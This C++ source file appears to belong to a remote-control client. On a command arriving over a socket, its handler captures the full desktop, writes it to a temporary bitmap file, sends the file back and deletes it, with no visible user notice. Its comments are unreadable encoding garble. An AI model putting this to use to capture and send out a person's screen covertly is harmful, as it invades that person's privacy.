#include "SSP_OnRecv.h"
#include <time.h>
/*
#include <gdiplus.h>
using namespace Gdiplus;
*/
BOOL SaveBitmapToFile(HBITMAP hBitmap, LPSTR lpFileName, int Quality);
HBITMAP CopyScreenToBitmap();


void Recv_Cmd_GetScreen(SSprotocol& sock) {
	char response[255];
	HBITMAP hbmp = CopyScreenToBitmap();
	time_t now; 
	time(&now); 

	char fileName[255 + 1] = {};
	sprintf_s(fileName, sizeof(fileName), "temp_screen_%lld", now);
	
	SaveBitmapToFile(hbmp, fileName, 4);
	Recv_Cmd_GetFile(sock, fileName, 255);
	
	DeleteFile(fileName);
}




BOOL SaveBitmapToFile(HBITMAP hBitmap, LPSTR lpFileName, int Quality)
{
	HDC hDC;                        // �豸������  

	int iBits;                      // ��ǰ��ʾ�ֱ�����ÿ��������ռ�ֽ���  
	WORD wBitCount;                 // λͼ��ÿ��������ռ�ֽ���  
	DWORD dwPaletteSize = 0, dwBmBitsSize, dwDIBSize, dwWritten;    // ��ɫ���С��λͼ���ݴ�С��λͼ�ļ���С��д���ļ��ֽ���  
	BITMAP Bitmap;                  //λͼ���Խṹ  
	BITMAPFILEHEADER bmfHdr;        // λͼ�ļ�ͷ  
	BITMAPINFOHEADER bi;            // λͼ��Ϣͷ  
	LPBITMAPINFOHEADER lpbi;        // ָ��λͼ��Ϣͷ�ṹ  

	HANDLE fh, hDib;                // �����ļ��������ڴ���  
	HPALETTE hPal, hOldPal = NULL;    // ��ɫ����  

	// ����λͼ�ļ�ÿ��������ռ�ֽ���  
	hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
	DeleteDC(hDC);
	/*
	if (iBits <= 1)
	wBitCount = 1;
	else if (iBits <= 4)
	wBitCount = 4;
	else if (iBits <= 8)
	wBitCount = 8;
	else if (iBits <= 24)
	wBitCount = 24;
	else
	wBitCount = 32;
	*/
	wBitCount = Quality;

	if (wBitCount <= 8)
		dwPaletteSize = (1i64 << wBitCount) * sizeof(RGBQUAD);       // �����ɫ���С  

	// ����λͼ��Ϣͷ�ṹ  
	GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&Bitmap);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = Bitmap.bmWidth;
	bi.biHeight = Bitmap.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = wBitCount;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	dwBmBitsSize = ((Bitmap.bmWidth * wBitCount + 31) / 32) * 4 * Bitmap.bmHeight;

	hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));  // Ϊλͼ���ݷ����ڴ�  
	lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
	*lpbi = bi;
	// �����ɫ��  
	hPal = (HPALETTE)GetStockObject(DEFAULT_PALETTE);
	if (hPal)
	{
		hDC = GetDC(NULL);
		hOldPal = SelectPalette(hDC, hPal, FALSE);
		RealizePalette(hDC);
	}
	// ��ȡ�õ�ɫ�����µ�����ֵ  
	GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize, (BITMAPINFO*)lpbi, DIB_RGB_COLORS);

	if (hOldPal)                // �ָ���ɫ��  
	{
		SelectPalette(hDC, hOldPal, TRUE);
		RealizePalette(hDC);
		ReleaseDC(NULL, hDC);
	}
	// ����λͼ�ļ�   
	fh = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (fh == INVALID_HANDLE_VALUE)
		return FALSE;

	// ����λͼ�ļ�ͷ  
	bmfHdr.bfType = 0x4D42;     // �ļ�����: "BM"  
	dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
	bmfHdr.bfSize = dwDIBSize;  // λͼ�ļ���С  
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

	WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);  // д��λͼ�ļ�ͷ  
	WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);                    // д��λͼ�ļ���������  

	GlobalUnlock(hDib);
	GlobalFree(hDib);
	CloseHandle(fh);

	return TRUE;
}

HBITMAP CopyScreenToBitmap()
{
	HDC hScrDC, hMemDC;             // ��Ļ���ڴ��豸������  
	HBITMAP hBitmap, hOldBitmap;    // λͼ���  
	int nWidth, nHeight;            // λͼ��Ⱥ͸߶�  


	hScrDC = CreateDC("DISPLAY", NULL, NULL, NULL);     // Ϊ��Ļ�����豸������  

	hMemDC = CreateCompatibleDC(hScrDC);                // Ϊ��Ļ�豸�����������ݵ��ڴ��豸������  

	nWidth = GetDeviceCaps(hScrDC, HORZRES);
	nHeight = GetDeviceCaps(hScrDC, VERTRES);

	hBitmap = CreateCompatibleBitmap(hScrDC, nWidth, nHeight);      // ����һ������Ļ�豸��������ݵ�λͼ  
	hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);            // ����λͼѡ���ڴ��豸��������  
	BitBlt(hMemDC, 0, 0, nWidth, nHeight, hScrDC, 0, 0, SRCCOPY); // ����Ļ�豸�����������ڴ��豸��������  
	hBitmap = (HBITMAP)SelectObject(hMemDC, hOldBitmap);            // �õ���Ļλͼ�ľ��  

	DeleteDC(hScrDC);
	DeleteDC(hMemDC);

	return hBitmap;
}


